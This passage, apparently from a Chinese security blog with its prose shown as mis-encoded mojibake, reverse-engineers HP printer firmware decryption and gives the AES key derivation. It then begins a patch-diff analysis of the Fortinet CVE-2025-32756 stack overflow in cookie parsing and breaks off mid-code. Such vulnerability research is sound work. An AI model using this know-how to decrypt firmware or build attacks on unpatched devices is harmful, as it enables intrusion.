<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> *__fastcall <span class="title function_">get_unknown_part</span><span class="params">(<span class="type">int</span> p_part2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> *p_part2_1; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( check_unknown_flag(&amp;dword_4B570) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(p_part2, unknown1);</span><br><span class="line">    <span class="keyword">return</span> p_part2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    p_part2_1 = p_part2;</span><br><span class="line">    *p_part2 = &amp;maybe_empty_string;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> p_part2_1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å®é™…ä¸Šå°±æ˜¯æŠŠ unknown1 èµ‹å€¼ç»™ part2ï¼Œé€šè¿‡äº¤å‰å¼•ç”¨åˆæ‰¾åˆ°äº†ç»™ unknown1 èµ‹å€¼çš„ä»£ç ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">stream = fopen(<span class="string">&quot;/rfs/.bio_pkg&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( stream )</span><br><span class="line">&#123;</span><br><span class="line">v26 = &amp;maybe_empty_string;</span><br><span class="line"><span class="keyword">while</span> ( fgets(data, <span class="number">100</span>, stream) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(data, <span class="string">&quot;BIO_FW_REV=&quot;</span>, <span class="number">11u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">data[<span class="number">0</span>] = <span class="built_in">tolower</span>(*v12);</span><br><span class="line">data[<span class="number">1</span>] = <span class="built_in">tolower</span>(v12[<span class="number">1</span>]);</span><br><span class="line">data[<span class="number">2</span>] = <span class="built_in">tolower</span>(v12[<span class="number">2</span>]);</span><br><span class="line">data[<span class="number">3</span>] = <span class="built_in">tolower</span>(v12[<span class="number">3</span>]);</span><br><span class="line">data[<span class="number">4</span>] = <span class="built_in">tolower</span>(v12[<span class="number">4</span>]);</span><br><span class="line">data[<span class="number">5</span>] = <span class="built_in">tolower</span>(v12[<span class="number">5</span>]);</span><br><span class="line">data[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;v27, data, &amp;v26);</span><br><span class="line">&#125;</span><br><span class="line">unknown1_1 = ::unknown1;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>å®é™…ä¸Šæ˜¯å°† &#x2F;.bio_pkg æ–‡ä»¶ä¸­çš„ <code>BIO_FW_REV</code> å­—æ®µçš„å‰ 6 ä¸ªå­—èŠ‚è½¬æ¢ä¸ºå°å†™èµ‹å€¼ç»™ unknown1ï¼Œè¿›ä¸€æ­¥åˆ†æï¼Œå°±æ˜¯å°†å›ºä»¶çš„å¼€å‘ä»£å·èµ‹å€¼ç»™ part2ï¼Œä»¥ OfficeJet Pro 8210 ä¸ºä¾‹ï¼Œè¿™ä¸ªå›ºä»¶ä»£å·æ˜¯ xml å…ƒæ•°æ®ä¸­ <code>updated_revision</code> å‚æ•°çš„å‰å…­ä¸ªå­—ç¬¦å³ <code>tespdl</code>ã€‚</p>
<p>part3 æ˜¯å¦è¦å‚ä¸è¿ç®—å–å†³äº <code>is_any</code> å‚æ•°çš„å€¼ï¼Œå®é™…ä¸Šå°±æ˜¯å›ºä»¶ä¸­çš„ <code>current_revision</code>ï¼Œå¦‚æœå®ƒæ˜¯ ANY çš„è¯å°±ä¸éœ€è¦è€ƒè™‘ part3ã€‚</p>
<p>part4 æ˜¯å¤–éƒ¨ä¼ å…¥çš„å‚æ•°ï¼Œç”±äºç¼ºå°‘å‡½æ•°è°ƒç”¨å…³ç³»ï¼Œæ— æ³•ç›´æ¥ç¡®å®šå®ƒæ˜¯ä»€ä¹ˆæ•°æ®ã€‚ä¾æ¬¡åˆ†æå¯èƒ½çš„å‡½æ•°ï¼Œæœ€ç»ˆæ‰¾åˆ°äº† <code>do_upgrade</code>ï¼Œå®ƒåº”è¯¥æ˜¯è´Ÿè´£å›ºä»¶è§£å¯†å’Œå‡çº§çš„å…³é”®å‡½æ•°ã€‚æ­¤å‡½æ•°é¦–å…ˆç”Ÿæˆ AES å¯†é’¥ï¼Œç„¶åè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œåœ¨å¾ªç¯ä¸­åˆ¤æ–­å½“å‰æ­£åœ¨å¤„ç†å“ªä¸ª blobï¼Œæ¥ç€é€šè¿‡ fork ç”Ÿæˆå­è¿›ç¨‹ï¼Œç­‰å¾…ç®¡é“ä¿¡æ¯ã€‚</p>
<p>åœ¨çˆ¶è¿›ç¨‹ä¸­ï¼Œä¼šè°ƒç”¨ <code>decrypt_data</code> å‡½æ•°æ¥å¯¹æ•°æ®åš AES è§£å¯†ã€‚è§£å¯†æ˜¯åˆ†å—è¿›è¡Œçš„ï¼Œæ¯ 0x10000 ä½œä¸ºä¸€ä¸ª blockï¼Œæ¯è§£å¯†ä¸€å—æ•°æ®ï¼Œå°±è°ƒç”¨ inflate å‡½æ•°å¯¹æ•°æ®è¿›è¡Œ zlib è§£å‹ã€‚</p>
<p>é€šè¿‡åˆ†æ <code>do_upgrade</code> çš„è§£å¯†å’Œè§£å‹é€»è¾‘ï¼Œèƒ½å¤Ÿè¿›ä¸€æ­¥ç¡®å®šå‡çº§åŒ…çš„æ–‡ä»¶æ ¼å¼ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Magic åŒºå—: \x1b%-12345@PJL\x0a</span><br><span class="line">å›ºä»¶åŸºç¡€ä¿¡æ¯åŒºå—: @PJL COMMENT xxx=xxx\x0a</span><br><span class="line">å›ºä»¶å¤§å°: @PJL UPGRADE SIZE=xxx\x0a</span><br><span class="line">Magic åŒºå—ç»“æŸ: \x1b%-12345@PJL COMMENT (null)\x0a</span><br><span class="line">è¿›å…¥å›ºä»¶å‡çº§å‘½ä»¤: @PJL ENTER LANGUAGE=FWUPDATE2\x0a</span><br><span class="line">Metadata é•¿åº¦: 16 è¿›åˆ¶ xxx\x0a</span><br><span class="line">Metadata: XML æ ¼å¼çš„æ•°æ®ï¼ŒåŒ…å«å…³é”®ä¿¡æ¯</span><br><span class="line">blob é•¿åº¦: 16 è¿›åˆ¶ xxx\x0a</span><br><span class="line">blob æ•°æ®: xxx</span><br><span class="line">blob é•¿åº¦: 16 è¿›åˆ¶ xxx\x0a</span><br><span class="line">blob æ•°æ®: xxx</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>å…³é”®ç‚¹åœ¨äºè§£å‹æ•°æ®ä¹‹åï¼Œä¼šè°ƒç”¨ fwrite å°†æ•°æ®å†™å…¥æœ¬åœ°æ–‡ä»¶ï¼Œç„¶åè°ƒç”¨ <code>SHA256_Update</code> æ›´æ–°ä¸€ä¸ª SHA256 å€¼ã€‚å½“å…¨éƒ¨æ•°æ®éƒ½å¤„ç†å®Œæ¯•ï¼Œä»£ç ä¼šå°†è®¡ç®—å¾—åˆ°çš„ SHA256 å€¼å’Œå˜é‡ x åšæ¯”è¾ƒï¼Œè€Œè¿™ä¸ªå˜é‡ x æ°å¥½æ˜¯ç”¨æ¥ç”Ÿæˆ AES å¯†é’¥çš„å‚æ•° part4ï¼Œå› æ­¤å¯ä»¥æ¨æµ‹ part4 å°±æ˜¯å›ºä»¶ä¸­å¯¹åº” blob çš„ <code>blob_digest_uncompressed</code> å€¼ã€‚</p>
<p>ç°åœ¨æ¥æ€»ç»“ä¸€ä¸‹å›ºä»¶è§£å¯†è¿‡ç¨‹ï¼Œé¦–å…ˆæ˜¯ xml å…ƒæ•°æ®ä¸­ï¼Œä¸€äº›æ ‡ç­¾çš„å«ä¹‰ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">signature_template_id: æœªçŸ¥</span><br><span class="line">public_key_id: ç”¨äºæ£€æŸ¥å›ºä»¶å®Œæ•´æ€§çš„å…¬é’¥ ID</span><br><span class="line">signature_value: å›ºä»¶ç­¾åæ•°æ®</span><br><span class="line">digest: Metadata æ•°æ®çš„ SHA256 å€¼</span><br><span class="line"></span><br><span class="line">å…¶ä¸­ï¼Œdigest éªŒè¯æ–¹æ³•ä¸ºï¼šè·å– signedInfo ä¸­çš„æ¯ä¸ªå­—ç¬¦ä¸²å€¼ï¼Œæ‹¼æ¥èµ·æ¥è®¡ç®— SHA256 å€¼ï¼Œä¸ signature ä¸­çš„ digest è¿›è¡Œæ¯”è¾ƒã€‚</span><br><span class="line"></span><br><span class="line">update_type: å›ºä»¶å‡çº§ç±»å‹ï¼Œä¸€èˆ¬ä¸º optional</span><br><span class="line">current_revision: ä½¿ç”¨è¯¥å›ºä»¶å‡çº§çš„ç‰ˆæœ¬é™åˆ¶ï¼Œä¸º ANY æ—¶è¡¨ç¤ºæ— ç‰ˆæœ¬é™åˆ¶</span><br><span class="line">updated_revision: è¯¥å›ºä»¶çš„ç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">LBI_blobã€rootfs_blob: å›ºä»¶çš„ä¸»ä½“æ•°æ®ï¼Œå…¶ä¸­ rootfs_blob å°±æ˜¯æ–‡ä»¶ç³»ç»Ÿã€‚ä¸€èˆ¬æƒ…å†µä¸‹å›ºä»¶åªåŒ…å« LBI å’Œ rootfsï¼Œè¿˜å¯ä»¥åŒ…å« patchã€recovery ç­‰ blob</span><br><span class="line"></span><br><span class="line">blob_path: blob è§£å¯†åå­˜æ”¾çš„é€»è¾‘ä½ç½®</span><br><span class="line">size_compressed: å‹ç¼©åçš„ blob å¤§å°</span><br><span class="line">size_uncompressed: è§£å‹åçš„ blob å¤§å°</span><br><span class="line">blob_digest_compressed: å‹ç¼©åçš„ blob Checksum (SHA256)</span><br><span class="line">blob_digest_uncompressed: è§£å‹åçš„ blob Checksum (SHA256)</span><br></pre></td></tr></table></figure></div>

<p>å…·ä½“çš„å›ºä»¶è§£å¯†æ–¹å¼ï¼š</p>
<ol>
<li>é€šè¿‡è§£æ Metadataï¼Œå¯ä»¥å°†å„ä¸ª blob ä»å›ºä»¶ä¸­åˆ†å‰²å‡ºæ¥ã€‚</li>
<li>é¦–å…ˆè¦è®¡ç®—ä¸€ä¸ª AES å¯†é’¥ï¼Œè®¡ç®—æ–¹å¼ä¸º <code>SHA256(&quot;@* WebFWUpdate&quot; + å›ºä»¶ä»£å· + blob_digest_uncompressed)[:16]</code>ï¼ŒIV ä¸º 0x00 * 16ã€‚</li>
<li>ä½¿ç”¨è®¡ç®—å¾—åˆ°çš„ AES å¯†é’¥å¯¹ blob è¿›è¡Œè§£å¯†ï¼Œè§£å¯†å¾—åˆ°çš„æ•°æ®è®¡ç®— SHA256 å€¼åº”è¯¥å’Œ <code>blob_digest_compressed</code> ç›¸åŒã€‚</li>
<li>å¯¹è§£å¯†çš„ blob è¿›è¡Œ zlib inflate è§£å‹ç¼©ï¼Œå¾—åˆ°çš„æ•°æ®é•¿åº¦åº”è¯¥å’Œ <code>size_uncompressed</code> ç›¸åŒï¼Œè®¡ç®— SHA256 å€¼åº”è¯¥å’Œ <code>blob_digest_uncompressed</code> ç›¸åŒã€‚</li>
</ol>
<p>ç»¼åˆä»¥ä¸Šæ€è·¯ï¼Œæˆ‘ç¼–å†™äº†ä¸€ä¸ªå°å·¥å…·å¯ä»¥ç”¨æ¥è§£å¯† HP æ‰“å°æœºå›ºä»¶(å¯èƒ½æ— æ³•è¦†ç›–å…¨éƒ¨å‹å·)ï¼Œä½ å¯ä»¥åœ¨ <a class="link"   href="https://github.com/rrrrrrri/hp-firmware-dec" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ä¸Šè·å–ã€‚</p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a class="link"   href="https://neodyme.io/en/blog/pwn2own-2022_printer_rce/" >https://neodyme.io/en/blog/pwn2own-2022_printer_rce/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/" >https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://vegamay.li/printer-part2" >https://vegamay.li/printer-part2<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://www.jsof-tech.com/unpacking-hp-firmware-updates-part-1/" >https://www.jsof-tech.com/unpacking-hp-firmware-updates-part-1/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2025-32756</title>
    <url>/2025/06/03/CVE-2025-32756/</url>
    <content><![CDATA[<p>2025 å¹´ 5 æœˆ 13 æ—¥ï¼ŒFortinet å‘å¸ƒäº†å½±å“ FortiMailã€FortiVoice ç­‰ç³»ç»Ÿçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´é¢„è­¦å…¬å‘Š <a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-25-254" >CVE-2025-32756<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œæœ¬æ–‡å¯¹æ­¤æ¼æ´è¿›è¡Œç®€è¦åˆ†æã€‚</p>
<p><strong>è¯¥æ¼æ´å·²å‘ç°åœ¨é‡åˆ©ç”¨ï¼Œå»ºè®®å—å½±å“çš„ç”¨æˆ·åŠæ—¶æ›´æ–°ç³»ç»Ÿç‰ˆæœ¬ã€‚</strong></p>
<span id="more"></span>

<blockquote>
<p>æœ¬æ–‡æœ‰éƒ¨åˆ†å†…å®¹æ˜¯å¤§æ¨¡å‹è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œæ¶‰åŠçš„éƒ¨åˆ†ä¼šä»¥ ğŸ¤– æ¥æ ‡è®°</p>
</blockquote>
<h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><p>Fortinet çš„æ¼æ´é¢„è­¦å…¬å‘Šä¸­æŒ‡å‡ºè¯¥æ¼æ´æ˜¯ä¸€ä¸ªä½äº API ä¸­çš„ï¼Œå½±å“ FortiVoice, FortiMail, FortiNDR, FortiRecorder, FortiCamera çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œå®ƒå…è®¸æœªæˆæƒçš„æ”»å‡»è€…åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç æˆ–è€…å‘½ä»¤ã€‚</p>
<p>åŒæ—¶å…¬å‘Šä¸­è¿˜ç»™å‡ºäº†è¯¦ç»†çš„ IoC ä¿¡æ¯ï¼Œå½“è¿™ä¸ªæ¼æ´è¢«åˆ©ç”¨æ—¶ï¼Œä¼šåœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹è¿›ç¨‹å´©æºƒä¿¡æ¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[x x x x:x:x.x 2025] [fcgid:warn] [pid 1829] [client x.x.x.x:x] mod_fcgid: error reading data, FastCGI server closed connection</span><br><span class="line">[x x x x:x:x.x 2025] [fcgid:error] [pid 1503] mod_fcgid: process /migadmin/www/fcgi/admin.fe(1741) exit(communication error), get unexpected signal 11</span><br></pre></td></tr></table></figure></div>

<p>ä»æ—¥å¿—ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒWeb æœåŠ¡ä¸­çš„ mod_fcgid æ¨¡å—ä¸ CGI ä¹‹é—´çš„è¿æ¥ä¸­æ–­äº†ï¼Œå¹¶ä¸” CGI ç¨‹åº admin.fe ç”±äºæ®µé”™è¯¯é€€å‡ºã€‚</p>
<p>é€šè¿‡è¿™äº›ä¿¡æ¯èƒ½å¤Ÿæ¨æµ‹å‡ºï¼š</p>
<ol>
<li>ç³»ç»Ÿçš„ Web æœåŠ¡ä½¿ç”¨äº† Apache httpd æˆ–è€…ç±»ä¼¼çš„ Web server</li>
<li>æ¼æ´ä½äº CGI ç¨‹åºä¸­ï¼Œèƒ½å¤Ÿç¡®å®š admin.fe æ˜¯ä¸€ä¸ªè§¦å‘ç‚¹ï¼Œä½†ä¹Ÿå¯èƒ½å¯ä»¥é€šè¿‡å…¶å®ƒæ¥å£è§¦å‘</li>
<li>æ¼æ´ç±»å‹ä¸ºæ ˆæº¢å‡ºï¼Œèƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤è¯´æ˜ç›®æ ‡ç¨‹åºæ²¡æœ‰å¼€å¯å¿…è¦çš„ç¼“è§£æªæ–½</li>
</ol>
<h1 id="è¡¥ä¸å¯¹æ¯”"><a href="#è¡¥ä¸å¯¹æ¯”" class="headerlink" title="è¡¥ä¸å¯¹æ¯”"></a>è¡¥ä¸å¯¹æ¯”</h1><p>å…¬å‘Šæåˆ°åœ¨ FortiVoice ä¸­æ£€æµ‹åˆ°åœ¨é‡åˆ©ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç”¨è¿™å¥—ç³»ç»Ÿè¿›è¡Œè¡¥ä¸å¯¹æ¯”ã€‚è·å–åˆ° FortiVoice 7.0.6 å’Œ 7.0.7 ä¸¤ä¸ª VM ç‰ˆæœ¬é•œåƒåˆ†æã€‚</p>
<p>é¦–å…ˆè¦è§£åŒ…ç³»ç»Ÿæ–‡ä»¶ï¼Œå’Œä»¥å¾€çš„æ€è·¯ä¸€æ ·ï¼Œå…ˆæŒ‚è½½ç£ç›˜ã€‚FortiVoice ä¸­çš„ rootfs.gz ç­‰å‹ç¼©åŒ…æ²¡æœ‰ç»è¿‡åŠ å¯†ï¼Œå¯ä»¥ç›´æ¥è§£å‹å¾—åˆ°æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚åŒæ—¶å¯ä»¥åœ¨ etc ç›®å½•ä¸‹æ‰¾åˆ° Apache httpd çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­ä¸€é¡¹å…³é”®é…ç½®æ˜¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alias /module /migadmin/www/fcgi/</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ¡è§„åˆ™å°†å‘å¾€ &#x2F;module çš„è¯·æ±‚æ˜ å°„åˆ° &#x2F;migadmin&#x2F;www&#x2F;fcgi&#x2F; ç›®å½•ä¸‹ï¼Œåˆšå¥½æ˜¯ IoC ä¸­æåˆ°çš„ CGI æ–‡ä»¶æ‰€åœ¨ç›®å½•ã€‚æ¯”è¾ƒä¸¤ä¸ªç‰ˆæœ¬çš„ CGI ç›®å½•ï¼Œåªæœ‰ä¸‰ä¸ªç¨‹åºå‘ç”Ÿäº†å˜åŒ–ï¼Œä½† admin.fe æ˜¯ç›¸åŒçš„</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2025-32756-1.png"
                     
                ></p>
<p>é€†å‘åˆ†æ admin.fe äºŒè¿›åˆ¶ç¨‹åºï¼Œå®ƒçš„ main å‡½æ•°å¦‚ä¸‹</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(uint param_1,<span class="type">char</span> **param_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  string *psVar1;</span><br><span class="line">  _func_FEWCmdbObj_ptr_string_ptr *p_Var2;</span><br><span class="line">  CFEWModuleManagerBase *<span class="keyword">this</span>;</span><br><span class="line">  allocator local_4a;</span><br><span class="line">  undefined1 local_49;</span><br><span class="line">  <span class="type">long</span> local_48 [<span class="number">3</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">curl_global_init</span>(<span class="number">3</span>);</span><br><span class="line">  FortiMail::FmailSalt::SaltHashImpl::<span class="built_in">initialize</span>(<span class="number">0xff</span>);</span><br><span class="line">  psVar1 = (string *)FortiMail::FEWCommonMain::<span class="built_in">instance</span>();</span><br><span class="line">  p_Var2 = (_func_FEWCmdbObj_ptr_string_ptr *)FortiMail::CFEWCmdbObjectFinder::<span class="built_in">instance</span>();</span><br><span class="line">  FortiMail::CFEWCmdbObjectFinder::<span class="built_in">setCallback</span>(p_Var2);</span><br><span class="line">  std::string::<span class="built_in">string</span>((string *)local_48,<span class="string">&quot;admin.fe&quot;</span>,&amp;local_4a);</span><br><span class="line">                    <span class="comment">/* try &#123; // try from 004030d9 to 004030dd has its CatchHandler @ 00403202 */</span></span><br><span class="line">  FortiMail::FEWCommonMain::<span class="built_in">title</span>(psVar1);</span><br><span class="line">  <span class="keyword">if</span> ((undefined8 *)(local_48[<span class="number">0</span>] + <span class="number">-0x18</span>) != &amp;std::string::_Rep::_S_empty_rep_storage) &#123;</span><br><span class="line">    <span class="built_in">FUN_00403680</span>((undefined8 *)(local_48[<span class="number">0</span>] + <span class="number">-0x18</span>),&amp;local_49);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="built_in">string</span>((string *)local_48,<span class="string">&quot;FVADMINCOOKIE&quot;</span>,&amp;local_4a);</span><br><span class="line">                    <span class="comment">/* try &#123; // try from 0040310c to 00403110 has its CatchHandler @ 004031db */</span></span><br><span class="line">  FortiMail::FEWCommonMain::<span class="built_in">scrambleV2CookieName</span>(psVar1);</span><br><span class="line">  <span class="keyword">if</span> ((undefined8 *)(local_48[<span class="number">0</span>] + <span class="number">-0x18</span>) != &amp;std::string::_Rep::_S_empty_rep_storage) &#123;</span><br><span class="line">    <span class="built_in">FUN_00403680</span>((undefined8 *)(local_48[<span class="number">0</span>] + <span class="number">-0x18</span>),&amp;local_49);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (FortiMail::CFEWModuleManagerT&lt;&gt;::m_instance == (CFEWModuleManagerBase *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="keyword">this</span> = (CFEWModuleManagerBase *)<span class="keyword">operator</span>.<span class="built_in">new</span>(<span class="number">0x58</span>);</span><br><span class="line">                    <span class="comment">/* try &#123; // try from 0040318d to 00403191 has its CatchHandler @ 004031c8 */</span></span><br><span class="line">    FortiMail::CFEWModuleManagerBase::<span class="built_in">CFEWModuleManagerBase</span>(<span class="keyword">this</span>);</span><br><span class="line">    *(undefined ***)<span class="keyword">this</span> = &amp;PTR_~CFEWModuleManagerT_006055b0;</span><br><span class="line">    FortiMail::CFEWModuleManagerT&lt;&gt;::m_instance = <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  FortiMail::FEWCommonMain::<span class="built_in">manager</span>((CFEWModuleManagerBase *)psVar1);</span><br><span class="line">  FortiMail::FEWCommonMain::<span class="built_in">session_creator</span>((_func_CFEWSession_ptr_Cgicc_ptr *)psVar1);</span><br><span class="line">  FortiMail::FEWCommonMain::<span class="built_in">x_initializer</span>((_func_int *)psVar1);</span><br><span class="line">  FortiMail::FEWCommonMain::<span class="built_in">main</span>((<span class="type">int</span>)psVar1,(<span class="type">char</span> **)(ulong)param_1,param_2);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>CGI ç¨‹åºè‡ªèº«æ²¡æœ‰å®ç°ä¸šåŠ¡é€»è¾‘ï¼Œè€Œæ˜¯ä¼šå¤§é‡å¼•ç”¨é“¾æ¥åº“ä¸­çš„å‡½æ•°ï¼Œé€šè¿‡æœç´¢å‡½æ•°åï¼Œåœ¨ &#x2F;lib ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ç³»åˆ—ç›¸å…³çš„é“¾æ¥åº“æ–‡ä»¶ï¼Œé€šè¿‡è¿›ä¸€æ­¥åˆ†æå¯ä»¥ç¡®å®šï¼Œå’Œæ¼æ´ç›¸å…³çš„å…³é”®é€»è¾‘ä½äº libhttputil.so ä¸­ã€‚</p>
<p>å¯¹ä¸¤ä¸ªç‰ˆæœ¬çš„æ–‡ä»¶è¿›è¡Œè¡¥ä¸å¯¹æ¯”ï¼Œlibhttputil.so ä¸»è¦æ˜¯ <code>cookieval_wrap</code> å’Œ <code>cookieval_unwrap</code> å‘ç”Ÿäº†å˜åŒ–ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2025-32756-2.png"
                     
                ></p>
<p>æ–°ç‰ˆæœ¬å¯¹æŸä¸ªå‚æ•°çš„é•¿åº¦è¿›è¡Œäº†æ£€æŸ¥ï¼Œè¦æ±‚å®ƒçš„é•¿åº¦ä¸èƒ½è¶…è¿‡ 0x19 å­—èŠ‚ï¼Œä¸‹é¢æ˜¯ <code>cookieval_unwrap</code> å‡½æ•°çš„éƒ¨åˆ†ä»£ç ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( cookie )</span><br><span class="line">&#123;</span><br><span class="line">authhash = <span class="number">0LL</span>;</span><br><span class="line">out_len = <span class="number">16</span>;</span><br><span class="line">size = <span class="built_in">strlen</span>(cookie) + <span class="number">1</span>;</span><br><span class="line">payload = <span class="number">0LL</span>;</span><br><span class="line">sub_11C0();</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">sscanf</span>(cookie, <span class="string">&quot;Era=%1d&amp;Payload=%m[^&amp;]&amp;AuthHash=%ms&quot;</span>, &amp;era, &amp;payload, &amp;authhash) == <span class="number">3</span></span><br><span class="line">  &amp;&amp; (s_1 = <span class="built_in">malloc</span>(size), (src = s_1) != <span class="number">0LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(s_1, <span class="number">0</span>, size);</span><br><span class="line">  <span class="keyword">if</span> ( era &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s_2 = authhash;</span><br><span class="line">    v27 = <span class="number">-1</span>;</span><br><span class="line">    s1_2 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    s_3 = authhash;</span><br><span class="line">    v4 = alloca(<span class="built_in">strlen</span>(authhash) + <span class="number">1</span>);</span><br><span class="line">    n10 = *s_3;</span><br><span class="line">    <span class="keyword">if</span> ( *s_3 )</span><br><span class="line">    &#123;</span><br><span class="line">      p_src = &amp;src_;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">      v9 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n10 == <span class="number">37</span> &amp;&amp; s_3[v9 + <span class="number">1</span>] == <span class="number">48</span> &amp;&amp; (s_3[v9 + <span class="number">2</span>] &amp; <span class="number">0xDF</span>) == <span class="number">0x41</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 += <span class="number">2</span>;</span><br><span class="line">          n10 = <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        *p_src = n10;</span><br><span class="line">        ++v8;</span><br><span class="line">        v9 = v7;</span><br><span class="line">        ++p_src;</span><br><span class="line">        n10 = s_3[v7];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( n10 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(&amp;src_ + v8) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(s_3, &amp;src_);</span><br><span class="line">    desta_1 = payload;</span><br><span class="line">    v11 = alloca(<span class="built_in">strlen</span>(payload) + <span class="number">1</span>);</span><br><span class="line">    n10_1 = *desta_1;</span><br><span class="line">    <span class="keyword">if</span> ( *desta_1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = &amp;src_;</span><br><span class="line">      v14 = <span class="number">0</span>;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">      v16 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n10_1 == <span class="number">37</span> &amp;&amp; desta_1[v16 + <span class="number">1</span>] == <span class="number">48</span> &amp;&amp; 